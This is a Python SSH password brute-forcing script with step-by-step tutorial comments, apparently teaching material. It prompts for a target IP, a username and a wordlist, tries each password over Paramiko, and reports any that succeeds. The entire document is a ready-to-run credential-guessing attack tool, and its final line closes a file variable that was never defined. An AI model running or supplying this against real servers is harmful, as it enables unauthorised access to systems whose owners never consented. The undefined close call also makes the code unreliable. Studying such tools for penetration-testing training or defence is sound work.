#We import modules to be used inside the script. 
#we will need Paramiko to interact with the SSH server on the target system. 
#"Sys" and "os" will provide us with the basic functionalities needed to read a file from the operating system(our password list in this case). 
#As we are using Paramiko to communicate with the SSH server, we do not need to import "socket". 
import paramiko
import sys
import os
 
#Inputs: This block will request input from the user. 
#An alternative way to do this would be to accept the user input directly from the command line as an argument using "sys.argv[]".
 
target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))
 
#SSH Connection: This section will create the "ssh_connect" function. 
#Successful authentication will return a code 0, a failed authentication will return a code 1.
 
def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code
 
#Password list: We then open the password file supplied earlier by the user and take each line as a password to be tried. 
 
with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
 
# Responses: The script tries to connect to the SSH server and decides on an output based on the response code. 
#Please note the response code here is the one generated by Paramiko and not an HTTP response code. 
#The script exits once it has found a valid password. 
        try:
            response = ssh_connect(password)
 
            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass
 
input_file.close()

